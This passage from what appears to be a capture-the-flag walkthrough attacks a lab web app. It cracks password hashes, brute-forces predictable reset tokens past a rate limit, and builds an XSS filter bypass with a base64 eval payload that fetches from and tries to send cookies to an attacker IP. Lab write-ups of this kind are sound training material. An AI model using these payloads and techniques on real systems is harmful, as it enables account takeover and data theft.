oxdf@hacky$ cat users | jq -r .[].password | sort -u > passwords
oxdf@hacky$ wc -l passwords
892 passwords

```

In fact, four users share the same password:

```

oxdf@hacky$ cat users | jq -r .[].password | sort | uniq -c | sort -nr | head -5
      4 ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f
      1 ff2c21005d7065681ba9cf8bf6b912403d97793227489fe8cbee5c9496313497
      1 ff2b53ba214455adc64160263594cae1b210a1e1564b68826c277dd211d2b60a
      1 fec8ac47294de153f1addda5a3c1f045e98375da962e59510d1a5204a13368af
      1 fe59ad6b243078459d27a7432be6dd6957d6489b5051095046a4f1b42dc87415

```

The `user_type` field is also interesting:

```

oxdf@hacky$ cat users | jq -r .[].user_type | sort | uniq -c | sort -nr
    894 Member
      1 Manager

```

There’s one manager (happens to be the first one, Charlie Rooper), and the rest are members. Charlie seems like an account to target if I can.

### Crack Passwords

On leaving Hashcat to detect the hash type, it suggests a handful of different possibilities:

```

$ /opt/hashcat-6.2.5/hashcat.bin passwords /usr/share/wordlists/rockyou.txt 
...[snip]...
The following 8 hash-modes match the structure of your input hash:

      # | Name                                                | Category
======+=====================================================+======================================
   1400 | SHA2-256                                            | Raw Hash
  17400 | SHA3-256                                            | Raw Hash
  11700 | GOST R 34.11-2012 (Streebog) 256-bit, big-endian    | Raw Hash
   6900 | GOST R 34.11-94                                     | Raw Hash
  17800 | Keccak-256                                          | Raw Hash
   1470 | sha256(utf16le($pass))                              | Raw Hash
  20800 | sha256(md5($pass))                                  | Raw Hash salted and/or iterated
  21400 | sha256(sha256_bin($pass))                           | Raw Hash salted and/or iterated
...[snip]...

```

I’ll start with 1400 / SHA2-256. It doesn’t take much time at all, but only cracks one hash, the one shared by four users:

```

$ /opt/hashcat-6.2.5/hashcat.bin passwords /usr/share/wordlists/rockyou.txt -m 1400
...[snip]...
ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f:password123
...[snip]...

```

### Access Site

These four users have the password “password123”:

```

oxdf@hacky$ cat users | jq '.[] | select (.password == "ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f")'
{
  "id": 432,
  "name": "Letha Runte",
  "email": "letha@snippet.htb",
  "email_verified_at": "2022-01-02 20:14:55",
  "password": "ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f",
  "remember_token": "2KTrBJhwcS",
  "created_at": "2022-01-02 20:15:00",
  "updated_at": "2022-01-02 20:15:00",
  "user_type": "Member"
}
{
  "id": 451,
  "name": "Fredrick Leannon",
  "email": "fredrick@snippet.htb",
  "email_verified_at": "2022-01-02 20:14:56",
  "password": "ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f",
  "remember_token": "Wxwje7DUuL",
  "created_at": "2022-01-02 20:15:01",
  "updated_at": "2022-01-02 20:15:01",
  "user_type": "Member"
}
{
  "id": 669,
  "name": "Gia Stehr",
  "email": "gia@snippet.htb",
  "email_verified_at": "2022-01-02 20:15:30",
  "password": "ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f",
  "remember_token": "E3DA7SBfP1",
  "created_at": "2022-01-02 20:15:37",
  "updated_at": "2022-01-02 20:15:37",
  "user_type": "Member"
}
{
  "id": 701,
  "name": "Juliana Thiel",
  "email": "juliana@snippet.htb",
  "email_verified_at": "2022-01-02 20:15:32",
  "password": "ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f",
  "remember_token": "2RMbcr2ZBg",
  "created_at": "2022-01-02 20:15:37",
  "updated_at": "2022-01-02 20:15:37",
  "user_type": "Member"
}

```

With any of those, I can log into the site:

![image-20220615141203603](https://0xdfimages.gitlab.io/img/image-20220615141203603.png)

The “New Snippet” shows a form:

![image-20220615141456936](https://0xdfimages.gitlab.io/img/image-20220615141456936.png)

On submitting anything, it redirects to `/snippets`, which is where the “Browse Snippets” link leads as well. There’s one public snippet along with mine:

![image-20220615205908973](https://0xdfimages.gitlab.io/img/image-20220615205908973.png)

Clicking the public one from isaac goes to `/snippets/1` and shows some code:

![image-20220615141614229](https://0xdfimages.gitlab.io/img/image-20220615141614229.png)

## Shell as Charlie

### IDOR

I’ll try to increment the number for the `/snippet/{id}` url, and it returns a snippet that I don’t have access to:

![image-20220615205744784](https://0xdfimages.gitlab.io/img/image-20220615205744784.png)

The content is obfuscated, but I can see the “Name”, “Language”, and “Author” fields. This snippet is about the Gitea API, which would definitely be interesting.

`/snippets/3` is my snippet. Looking at 4, there’s nothing there:

![image-20220615210003194](https://0xdfimages.gitlab.io/img/image-20220615210003194.png)

### Password Reset Analysis

#### Mail Access

The passwords from the snippet main site also seem to work on RoundCube:

![image-20220615142650198](https://0xdfimages.gitlab.io/img/image-20220615142650198.png)

All of the mailboxes seem to be empty.

I can reset one of the users’ passwords on the main site:

![image-20220615142726029](https://0xdfimages.gitlab.io/img/image-20220615142726029.png)

And the email comes:

![image-20220615142744931](https://0xdfimages.gitlab.io/img/image-20220615142744931.png)

The email contains a code that expires in five minutes. The link on the “Reset Password” button is to `http://snippet.htb/reset-password/5678473081c9a82309224fcd13c44078022?email=gia%40snippet.htb`. This fits the API endpoint described in the JavaScript:

```

{"key":"password.reset","value":{"uri":"reset-password/{token}","methods":["GET","HEAD"]}}
{"key":"password.update","value":{"uri":"reset-password","methods":["POST"]}}

```

Going to that URL loads a form for a new password:

![image-20220615155547395](https://0xdfimages.gitlab.io/img/image-20220615155547395.png)

Submitting that form sends a POST to `/reset-password`:

```

POST /reset-password HTTP/1.1
Host: snippet.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0
Accept: text/html, application/xhtml+xml
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: application/json
X-Inertia: true
X-Inertia-Version: 207fd484b7c2ceeff7800b8c8a11b3b6
X-XSRF-TOKEN: eyJpdiI6IjJrKy85azVtdGxyY2NKWWJFM01QeFE9PSIsInZhbHVlIjoid3hweldkd20zTVpRZ2NYSEd2ZDUyWGM1ei9IVkcyVjhVM0JrQTFqcENYYW9qSXdTdFh1SUtORmxwY3lzWHlyVlhqTEtIc2lWenQvdmd2d0gxbVN1L0VnY2NFL2NJOTdGK1VmSXJsaXlhNWZLazRCNStWNzNMT1lTVDNIelBRMHkiLCJtYWMiOiJhYWMxNjA1OWM0MGNhOGZiZGM4OWVkZGYyYmY1Y2Q2Njg4MTYzNWY4MzQ0MDhjM2ZlMjI1MGJmZTQ2YzY4MWRkIiwidGFnIjoiIn0=
Content-Length: 136
Origin: http://snippet.htb
Connection: close
Referer: http://snippet.htb/reset-password/5678473081c9a82309224fcd13c44078339?email=gia%40snippet.htb
Cookie: XSRF-TOKEN=eyJpdiI6IjJrKy85azVtdGxyY2NKWWJFM01QeFE9PSIsInZhbHVlIjoid3hweldkd20zTVpRZ2NYSEd2ZDUyWGM1ei9IVkcyVjhVM0JrQTFqcENYYW9qSXdTdFh1SUtORmxwY3lzWHlyVlhqTEtIc2lWenQvdmd2d0gxbVN1L0VnY2NFL2NJOTdGK1VmSXJsaXlhNWZLazRCNStWNzNMT1lTVDNIelBRMHkiLCJtYWMiOiJhYWMxNjA1OWM0MGNhOGZiZGM4OWVkZGYyYmY1Y2Q2Njg4MTYzNWY4MzQ0MDhjM2ZlMjI1MGJmZTQ2YzY4MWRkIiwidGFnIjoiIn0%3D; snippethtb_session=eyJpdiI6InNRMFdQWndrRFNhTStCazNjek96Y0E9PSIsInZhbHVlIjoiNnp2Nis5aWhBeVBIZEl1QmYwaHJhOE5UWDBGeW1jNHFEbHdDdUEwZkRvVEt3d292Y3R5T3FZWEdyUWpFZ1RKdjB5d1U0b1djekc4UTZ1SGdtRVJyQXI5aUFpYWpmN05DUnUvcEMxYjE1SzNDMStXUWtMVlZtbFJtL2hKOE9MOEkiLCJtYWMiOiIxNDEyYTA3ZjAxOGQ3ODY0NmViYzgzYmNmM2JlMzkwOTViYTM4ZmQyYmVhYTc3NDcyN2JkMTU0MDg5M2YxMDVlIiwidGFnIjoiIn0%3D

{"token":"5678473081c9a82309224fcd13c44078339","email":"gia@snippet.htb","password":"password123","password_confirmation":"password123"}

```

That post includes the token, the email, and the new password.

#### Token Analysis

Taking a closer look at the token, if I request a few more password resets for the same user, I’ll notice that only the last few digits are changing:

```

5678473081c9a82309224fcd13c44078998
5678473081c9a82309224fcd13c44078243
5678473081c9a82309224fcd13c44078468
5678473081c9a82309224fcd13c44078022

```

The token is 35 characters long, and hex. A few guesses and it’s clear that the first 32 characters are the MD5 hash of the username:

```

oxdf@hacky$ echo -n "5678473081c9a82309224fcd13c44078022" | wc -c
35
oxdf@hacky$ echo -n "gia" | md5sum
64df52a03a4bc8c7a95aa8b29ee436e1  -
oxdf@hacky$ echo -n "gia@snippet.htb" | md5sum
5678473081c9a82309224fcd13c44078  -

```

### Brute Fail

#### Generate Request Data

This means I can request a reset for a user, and then with an average of 500 / max 1000 requests, brute force the reset url.

My initial idea is to target Jean Castux, the owner of that snap with the Gitea information:

```

oxdf@hacky$ cat users | jq '.[] | select(.name=="Jean Castux")'
{
  "id": 664,
  "name": "Jean Castux",
  "email": "jean@snippet.htb",
  "email_verified_at": "2022-01-02 20:15:30",
  "password": "5b1aabe349364a0b31cc257e289751343cad3d206708b8d5effdd138d5ae3484",
  "remember_token": "naXzYffXKP",
  "created_at": "2022-01-02 20:15:37",
  "updated_at": "2022-01-02 20:15:37",
  "user_type": "Member"
}

```

I’ll calculate the hash:

```

oxdf@hacky$ echo -n "jean@snippet.htb" | md5sum
485e80367de25d57b07aa692feeedf8f  -

```

#### Get curl Command

To test this, I’ll look at the legit password reset above in Burp. If I change the token so it’s wrong and send again with Repeater, the response is an HTTP 200 OK with the payload:

```

{
    "component":"Auth\/ResetPassword",
    "props":{
        "errors":{},
        "auth":{
            "user":null
        },
        "flash":{
            "message":null
        },
        "status":"This password reset token is invalid."
    },
    "url":"\/reset-password",
    "version":"207fd484b7c2ceeff7800b8c8a11b3b6"
}

```

I’ll use this to generate a `curl` command. It’s trickier than it seems, because it needs some additional headers. This eventually works for me (works meaning it returns the expected failure message):

```

oxdf@hacky$ curl http://snippet.htb/reset-password \
> -H 'Content-Type: application/json' \
> -H 'X-Inertia: true' \
> -H 'X-Inertia-Version: 207fd484b7c2ceeff7800b8c8a11b3b6' \
> -H "X-XSRF-TOKEN: $XSRF" \
> -b "XSRF-TOKEN=$XSRF; snippethtb_session=$SESS" \
> -d '{"token":"485e80367de25d57b07aa692feeedf8f000","email":"jean@snippet.htb","password":"0xdf0xdf","password_confirmation":"0xdf0xdf"}'
{"component":"Auth\/ResetPassword","props":{"errors":{},"auth":{"user":null},"flash":{"message":null},"status":"This password reset token is invalid."},"url":"\/reset-password","version":"207fd484b7c2ceeff7800b8c8a11b3b6"}

```

I don’t really know what `X-Inertia` is, but it’s in the request when I do the password reset in Firefox, and it seems to need to be there.

#### Brute

I’ll reset jean’s password via the form:

![image-20220615210631065](https://0xdfimages.gitlab.io/img/image-20220615210631065.png)

I’ll generate a quick wordlist of the numbers 000-999:

```

oxdf@hacky$ printf "%.3d\n" {0..999} > nums

```

Now I’ll use `wfuzz` to try all 1000 pins (if a bunch of 419s come back, I’ll need to refresh my `XSRF` and `SESS` variables):

```

oxdf@hacky$ wfuzz -u http://snippet.htb/reset-password -H 'Content-Type: application/json' -H 'X-Inertia: true' -H 'X-Inertia-Version: 207fd484b7c2ceeff7800b8c8a11b3b6' -H "X-XSRF-TOKEN: $XSRF" -b "XSRF-TOKEN=$XSRF; snippethtb_session=$SESS" -d '{"token":"e3352e7737d0b111d604a5736d87af1bFUZZ","email":"jean@snippet.htb","password":"password123","password_confirmation":"password123"}' -w nums --hs "reset token is invalid"
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://snippet.htb/reset-password
Total requests: 1000

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000005:   200        0 L      10 W     236 Ch      "004"
000000010:   200        0 L      10 W     236 Ch      "009"
000000007:   200        0 L      10 W     236 Ch      "006"
000000008:   200        0 L      10 W     236 Ch      "007"
000000009:   200        0 L      10 W     236 Ch      "008"
000000011:   200        0 L      10 W     236 Ch      "010"
000000012:   200        0 L      10 W     236 Ch      "011"
000000013:   200        0 L      10 W     236 Ch      "012"
000000014:   200        0 L      10 W     236 Ch      "013"
000000015:   200        0 L      10 W     236 Ch      "014"
000000016:   200        0 L      10 W     236 Ch      "015"
000000017:   200        0 L      10 W     236 Ch      "016"
000000018:   200        0 L      10 W     236 Ch      "017"
^C
Finishing pending requests...

```

I’m using `--hs "reset token is invalid"` to hide that message, but something happens after 5 requests or so where the result changes.

`curl` shows a new message:

```

oxdf@hacky$ curl http://snippet.htb/reset-password -H 'Content-Type: application/json' -H 'X-Inertia: true' -H 'X-Inertia-Version: 207fd484b7c2ceeff7800b8c8a11b3b6' -H "X-XSRF-TOKEN: $XSRF" -b "XSRF-TOKEN=$XSRF; snippethtb_session=$SESS" -d '{"token":"485e80367de25d57b07aa692feeedf8f000","email":"jean@snippet.htb","password":"0xdf0xdf","password_confirmation":"0xdf0xdf"}'
{"component":"Auth\/ResetPassword","props":{"errors":{},"auth":{"user":null},"flash":{"message":null},"status":"Too many attempts! You may try again in 52 seconds."},"url":"\/reset-password","version":"207fd484b7c2ceeff7800b8c8a11b3b6"}

```

I’ve been blocked, probably for one minute. If I can only do five requests per minute, it’s going to take way too long to do ~500.

### Password Reset Revisited

At one point, I requested several resets for the gia account within the same minute. My initial assumption is that once an email is sent, all previous tokens are invalidated. But not knowing which was most recent, I’ll try one in the middle, and it works:

![image-20220615211002391](https://0xdfimages.gitlab.io/img/image-20220615211002391.png)

In fact, I’ll try some others and they work too. This experiment teaches me two things:
- The tokens don’t see to invalidate with new tokens, but rather all are stored for five minutes before they expire.
- There’s not the same limit of five requests within a minute on the request API endpoint (as shown by the nine emails with the same timestamp in the image above).

This means that I can potentially issue hundreds of resets, enough that my five attempts are likely to land at least one correctly.

### Brute Success

I’ll start by sending 500 password reset requests for jean:

```

oxdf@hacky$ time for i in {1..500}; do \
> curl -s http://snippet.htb/forgot-password \
> -H 'Content-Type: application/json' \
> -H 'X-Inertia: true' \
> -H 'X-Inertia-Version: 207fd484b7c2ceeff7800b8c8a11b3b6' \
> -H "X-XSRF-TOKEN: $XSRF" \
> -b "XSRF-TOKEN=$XSRF; snippethtb_session=$SESS" \
> -d '{"email":"jean@snippet.htb"}' | \
> grep -q "<title>Redirecting to" || break; \
> echo -ne "$i\r"; \
> done
500
real    2m33.439s
user    0m3.157s
sys     0m2.436s

```

I’ve got the `curl` redirecting into a `grep` to check for the successful string and breaking if that’s not found so I can troubleshoot (419 errors with the XSRF needing a refresh was my most common issue). I also have it printing a counter (over itself on the same line using `\r`) so that I can track progress.

Once this finishes, I’ll send a password reset request with an arbitrary last three digits. 223 fails:

```

oxdf@hacky$ curl http://snippet.htb/reset-password -H 'Content-Type: application/json' -H 'X-Inertia: true' -H 'X-Inertia-Version: 207fd484b7c2ceeff7800b8c8a11b3b6' -H "X-XSRF-TOKEN: $XSRF" -b "XSRF-TOKEN=$XSRF; snippethtb_session=$SESS" -d '{"email":"jean@snippet.htb","password":"0xdf0xdf","password_confirmation":"0xdf0xdf", "token":"485e80367de25d57b07aa692feeedf8f223"}'; echo
{"component":"Auth\/ResetPassword","props":{"errors":{},"auth":{"user":null},"flash":{"message":null},"status":"This password reset token is invalid."},"url":"\/reset-password","version":"207fd484b7c2ceeff7800b8c8a11b3b6"}

```

But 224 succeeds:

```

oxdf@hacky$ curl http://snippet.htb/reset-password -H 'Content-Type: application/json' -H 'X-Inertia: true' -H 'X-Inertia-Version: 207fd484b7c2ceeff7800b8c8a11b3b6' -H "X-XSRF-TOKEN: $XSRF" -b "XSRF-TOKEN=$XSRF; snippethtb_session=$SESS" -d '{"email":"jean@snippet.htb","password":"0xdf0xdf","password_confirmation":"0xdf0xdf", "token":"485e80367de25d57b07aa692feeedf8f224"}'; echo
{"component":"Auth\/Login","props":{"errors":{},"auth":{"user":null},"flash":{"message":null},"status":"Your password has been reset!"},"url":"\/reset-password","version":"207fd484b7c2ceeff7800b8c8a11b3b6"}

```

This will be random, but with 500 requests in, the odds of success in five tries is very high.

I can log in as jean with my set password and get the details of that snippet:

![image-20220616082952429](https://0xdfimages.gitlab.io/img/image-20220616082952429.png)

It’s an API key for Gitea.

And it works:

```

oxdf@hacky$ curl -XGET http://dev.snippet.htb/api/v1/users/jean/tokens -H 'accept: application/json' -H 'authorization: basic amVhbjpFSG1mYXIxWTdwcEE5TzVUQUlYblluSnBB'
[]

```

If I change a character in the `authorization` header, it doesn’t work (in this case, lower-casing the last `b`):

```

oxdf@hacky$ curl -XGET http://dev.snippet.htb/api/v1/users/jean/tokens -H 'accept: application/json' -H 'authorization: Basic amVhbjpFSG1mYXIxWTdwcEE5TzVUQUlYblluSnBb'
{"message":"basic auth required","url":"http://dev.snippet.htb/api/swagger"}

```

### Gitea Login

That’s a basic auth token, which means it base64 decodes to a username and password:

```

oxdf@hacky$ echo "amVhbjpFSG1mYXIxWTdwcEE5TzVUQUlYblluSnBB" | base64 -d
jean:EHmfar1Y7ppA9O5TAIXnYnJpA

```

I’ll try these creds for SSH, but only key auth is allowed:

```

oxdf@hacky$ sshpass -p EHmfar1Y7ppA9O5TAIXnYnJpA ssh jean@snippet.htb
jean@snippet.htb: Permission denied (publickey).

```

Still, they do work to log in to Gitea:

![image-20220624141215097](https://0xdfimages.gitlab.io/img/image-20220624141215097.png)

### jean / extension

#### Gitea Enum

There’s one repo, extension:

![image-20220623133228739](https://0xdfimages.gitlab.io/img/image-20220623133228739.png)

It’s a browser plugin designed to help summarize issues on Gitea.

#### Browser Extension

[This link](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Your_first_WebExtension) from Mozilla describes the pieces of a browser extension. The `manifest.json` file defines the extension:

```

{
  "name": "Gitea Issue Preview",
  "description": "An extension built for previewing gitea issues!",
  "version": "1.0",
  "key": "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwVFvaYSBlV4MEI2fbMuZof5It4MESB+Vu+JGthOvn9I6k+J7n+AO4N5YWhHTFjP/Y9bEQnWhiq9tPj91/ccD1x1taTTYZWAP1QgHGgiMMq5hmQAh2wxiqNpE5LEO4B0lL+BGAfBZ0DUNV4umFa66/jzECNpQ1ZwWgS81/gbzSnPNHHf1MReFg9578VVi0u0+hiFO0UTnRCmrnm00w3xO8UGP7Gk3vIs1jmeC7Bl1Qy5OGow6+8eJn3j2C9NPqVsQGIuJY6ZOSKyZOqd7Og8d6mNiIbMqBUw1Mof7VJhRCGr1v+swvMW4RY/sht01Aaa7DMrJnVtBTTu9UN3FkWRAOwIDAQAB",
  "manifest_version": 2,
  "content_scripts": [
    {
      "matches": [
        "*://*/*/issues"
      ],
      "js": [
        "inject.js"
      ]
    }
  ],
  "permissions": [
    "identity",
    "storage",
    "activeTab",
    "scripting"
  ],
  "content_security_policy": "script-src 'self'; object-src 'self';"
}

```

It will run on pages that match `*://*/*/issues` (so ending in `/issues`), and runs `inject.js`.

`inject.js` gets the issue list from the page, and then loops over each:

```

const list = document.getElementsByClassName("issue list")[0];
const log = console.log

if (!list) {
    log("No gitea page..")
} else {
    const elements = list.querySelectorAll("li");
    elements.forEach((item, index) => {
        const link = item.getElementsByClassName("title")[0]
        const url = link.protocol + "//" + link.hostname + "/api/v1/repos" + link.pathname
        log("Previewing %s", url)
        fetch(url).then(response => response.json())
            .then(data => {
                let issueBody = data.body;
                const limit = 500;
                if (issueBody.length > limit) {
                    issueBody = issueBody.substr(0, limit) + "..."
                }
                issueBody = ": " + issueBody
                issueBody = check(issueBody)
                const desc = item.getElementsByClassName("desc issue-item-bottom-row df ac fw my-1")[0]
                desc.innerHTML += issueBody
            });
    });
}
...[snip]...

```

For each, it gets the URL for the full issue, fetches that page, gets the issue body and adds the first up to 500 characters of the issue into the current HTML. That text is passed through `check`, which is also defined:

```

...[snip]...
/**
 * @param str
 * @returns {string|*}
 */
function check(str) {
    // remove tags
    str = str.replace(/<.*?>/, "")
    const filter = [";", "\'", "(", ")", "src", "script", "&", "|", "[", "]"]
    for (const i of filter) {
        if (str.includes(i))
            return ""
    }
    return str
}

```

This is clearly mean to filter XSS attempts.

#### Install Extension

I’ll download the files to my host, and install this extension by going to `about:debugging` in Firefox. Then I’ll click “This Firefox” on the left hand side, which shows no Temporary Extensions:

![image-20220622175336302](https://0xdfimages.gitlab.io/img/image-20220622175336302.png)

Clicking “Load Temporary Add-on…” pops a file finder, where I can select any file from the directory with the extension (like `manifest.json` or `inject.js`).

I’ll create a test issue on the repo:

[![image-20220622175633679](https://0xdfimages.gitlab.io/img/image-20220622175633679.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220622175633679.png)

Without the plugin, it shows on the main page as:

[![image-20220622175648846](https://0xdfimages.gitlab.io/img/image-20220622175648846.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220622175648846.png)

With the plugin:

[![image-20220622175617559](https://0xdfimages.gitlab.io/img/image-20220622175617559.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220622175617559.png)

Looking in the console, it printed:

```

Previewing http://dev.snippet.htb/api/v1/repos/jean/extension/issues/3

```

That URL gives the issue detail as JSON:

```

{"id":14,"url":"http://dev.snippet.htb/api/v1/repos/jean/extension/issues/5","html_url":"http://dev.snippet.htb/jean/extension/issues/5","number":5,"user":{"id":2,"login":"jean","full_name":"","email":"jean@snippet.htb","avatar_url":"http://dev.snippet.htb/user/avatar/jean/-1","language":"","is_admin":false,"last_login":"0001-01-01T00:00:00Z","created":"2021-12-27T00:05:34Z","restricted":false,"active":false,"prohibit_login":false,"location":"","website":"","description":"","visibility":"public","followers_count":0,"following_count":0,"starred_repos_count":0,"username":"jean"},"original_author":"","original_author_id":0,"title":"Test","body":"not bold\u003cb\u003etest\u003c/b\u003e","ref":"","labels":[],"milestone":null,"assignee":null,"assignees":null,"state":"open","is_locked":false,"comments":0,"created_at":"2022-06-23T12:41:45Z","updated_at":"2022-06-23T12:41:45Z","closed_at":null,"due_date":null,"pull_request":null,"repository":{"id":8,"name":"extension","owner":"jean","full_name":"jean/extension"}}

```

So the plug-in takes that data and gets `body`, which is:

```

This is a test issue.

```

I can put HTML into the issue body, and that is also comes through here:

![image-20220623084328740](https://0xdfimages.gitlab.io/img/image-20220623084328740.png)

#### Cleanup

Issues in this repo get deleted very fast. As I already suspect that I’ll be using XSS here, that’s a good indication that it’s the right path, and that some automation is interacting with these issues. Perhaps whoever is reading them is deleting issues that aren’t relevant to the project.

The good news is that I can send the POST request to create an issue to Burp Repeater and submit issues over and over again as I test. I’ll have to get used to checking quickly after submitting.

### XSS Filter Bypass

#### Load Tag

The extension is taking raw user-controlled content and putting it as code onto the page. The first challenge is to bypass the `check` function. I’ll load it into a Firefox dev tools console:

![image-20220623134225362](https://0xdfimages.gitlab.io/img/image-20220623134225362.png)

Right away, I’ll notice that it’s only removing the starting tag:

![image-20220623115135383](https://0xdfimages.gitlab.io/img/image-20220623115135383.png)

In fact, it’s only removing the first tag:

![image-20220623115158631](https://0xdfimages.gitlab.io/img/image-20220623115158631.png)

So I have a way to get a tag loaded. To test, I’ll create an issue with a bold tag:

![image-20220623134346844](https://0xdfimages.gitlab.io/img/image-20220623134346844.png)

It works:

![image-20220623134406824](https://0xdfimages.gitlab.io/img/image-20220623134406824.png)

#### Load Tag Capable of Script

Two common ways to get a script to run in an XSS attack are with `<script>` tags or with something like an `<img>` tag with a bad `src` attribute and an `onerror` attribute that provides the script to run. I’ll need to bypass the `filter` string. Both `src` and `script` are terms that will get the text removed.

![image-20220623134549864](https://0xdfimages.gitlab.io/img/image-20220623134549864.png)

However, this is case-sensitive search, and [HTML is not case sensitive](https://www.w3schools.com/html/html_elements.asp#:~:text=HTML%20is%20Not%20Case%20Sensitive).

![image-20220623134701223](https://0xdfimages.gitlab.io/img/image-20220623134701223.png)

I’ll try some payloads like

```

<><Script Src=http://10.10.14.6/x.js></Script>

```

These get loaded into the page by the extension:

![image-20220623140447679](https://0xdfimages.gitlab.io/img/image-20220623140447679.png)

But it never reaches back to my webserver. I believe there are limits on how extensions can load remote scripts, but I’m not 100% sure there.

I’ll try an `<img>` instead with:

```

<><img SRC=http://10.10.14.6/test.img />

```

When I put this in, it loads a broken image icon:

![image-20220623144707683](https://0xdfimages.gitlab.io/img/image-20220623144707683.png)

And there’s hits at the webserver (that’s my browser loading the page):

```

oxdf@hacky$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.14.6 - - [23/Jul/2022 18:46:43] code 404, message File not found
10.10.14.6 - - [23/Jul/2022 18:46:43] "GET /test.img HTTP/1.1" 404 -

```

And a few seconds later, from Extension (that’s someone else on Extension!):

```
10.10.10.224 - - [23/Jul/2022 18:47:02] code 404, message File not found
10.10.10.224 - - [23/Jul/2022 18:47:02] "GET /test.img HTTP/1.1" 404 -

```

This is a good sign that XSS is a vector here.

#### Load Script

I’d like to try something like this to test running JavaScript:

```

<><img SRC=http://10.10.14.6/test.img onerror=alert(1) />

```

Unfortunately, `()` won’t make it past the `check` call:

![image-20220623151242976](https://0xdfimages.gitlab.io/img/image-20220623151242976.png)

Some Googling shows [this StackOverflow answer](https://stackoverflow.com/a/35949617) about how to run a function in JavaScript without `()`. The author lists 7 options, but number 5 jumped out as possible:

![image-20220623151804444](https://0xdfimages.gitlab.io/img/image-20220623151804444.png)

It would bypass check:

![image-20220623151836661](https://0xdfimages.gitlab.io/img/image-20220623151836661.png)

On creating that as the body of an issue, and refreshing the issues main page, there’s a hit at my webserver:

```
10.10.14.6 - - [23/Jul/2022 19:19:07] code 404, message File not found
10.10.14.6 - - [23/Jul/2022 19:19:07] "GET /test.img HTTP/1.1" 404 -

```

And it loads the `alert()`:

![image-20220623151949006](https://0xdfimages.gitlab.io/img/image-20220623151949006.png)

That’s JavaScript running.

#### Run Base64 Code

I want to write a small cradle that will, bypassing the filters, take a base64-encoded string, decode, and run it. Then I can build more complicated commands, and encode them and generate a new payload.

[This GitHub Gist](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md) has a bunch of JavaScript payloads that avoid `()`. I’ll use a couple of these to generate a payload:

```

eval.call`${'alert\x2823\x29'}`

```

I can start building out something in the dev tools console:

![image-20220623154951088](https://0xdfimages.gitlab.io/img/image-20220623154951088.png)

This dummy base64 payload will help figure out when it works:

```

oxdf@hacky$ echo 'console.log("hello")' | base64
Y29uc29sZS5sb2coImhlbGxvIikK

```

And eventually I’ll get it to work:

![image-20220623162637491](https://0xdfimages.gitlab.io/img/image-20220623162637491.png)

I’ll change the base64:

```

oxdf@hacky$ echo "alert(1)" | base64
YWxlcnQoMSkK

```

Putting that all together leads to a payload of:

```

<><img SRC=http://10.10.14.6/test.img onerror=eval.call`${"eval\x28atob`YWxlcnQoMSkK`\x29"}` />

```

It works:

![image-20220623162716169](https://0xdfimages.gitlab.io/img/image-20220623162716169.png)

#### Connection Back

I’ll use the same syntax used in the plugin itself, where it’s using `fetch` to get API data.

```

oxdf@hacky$ echo 'fetch("http://10.10.14.6/makeFetchHappen");' | base64
ZmV0Y2goImh0dHA6Ly8xMC4xMC4xNC42L21ha2VGZXRjaEhhcHBlbiIpOwo=

```

This builds to:

```

<><img SRC=http://10.10.14.6/test.img onerror=eval.call`${"eval\x28atob`ZmV0Y2goImh0dHA6Ly8xMC4xMC4xNC42L21ha2VGZXRjaEhhcHBlbiIpOwo=`\x29"}` />

```

On submitting and reloading, I get from my own browser:

```
10.10.14.6 - - [23/Jul/2022 20:53:55] code 404, message File not found
10.10.14.6 - - [23/Jul/2022 20:53:55] "GET /test.img HTTP/1.1" 404 -
10.10.14.6 - - [23/Jul/2022 20:53:55] code 404, message File not found
10.10.14.6 - - [23/Jul/2022 20:53:55] "GET /makeFetchHappen HTTP/1.1" 404 -

```

And later from Extension:

```
10.10.10.224 - - [23/Jul/2022 20:54:27] code 404, message File not found
10.10.10.224 - - [23/Jul/2022 20:54:27] "GET /test.img HTTP/1.1" 404 -
10.10.10.224 - - [23/Jul/2022 20:54:27] code 404, message File not found
10.10.10.224 - - [23/Jul/2022 20:54:27] "GET /makeFetchHappen HTTP/1.1" 404 -

```

#### Cookie Fail

I can try to get cookies with something like this:

```

fetch("http://10.10.14.6/cookie?c=" + document.cookie);

```

Unfortunately, it doesn’t read a cookie for me or for Extension:

```
10.10.14.6 - - [23/Jul/2022 21:00:18] code 404, message File not found
10.10.14.6 - - [23/Jul/2022 21:00:18] "GET /test.img HTTP/1.1" 404 -
10.10.14.6 - - [23/Jul/2022 21:00:18] code 404, message File not found
10.10.14.6 - - [23/Jul/2022 21:00:18] "GET /cookie?c= HTTP/1.1" 404 -
10.10.10.224 - - [23/Jul/2022 21:00:52] code 404, message File not found
10.10.10.224 - - [23/Jul/2022 21:00:52] "GET /test.img HTTP/1.1" 404 -
10.10.10.224 - - [23/Jul/2022 21:00:52] code 404, message File not found
10.10.10.224 - - [23/Jul/2022 21:00:52] "GET /cookie?c= HTTP/1.1" 404 -

```

The issue is that all the cookies for Gitea are using the `HttpOnly` flag:

![image-20220623170232621](https://0xdfimages.gitlab.io/img/image-20220623170232621.png)

[The docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies) say that is designed to prevent this attack:

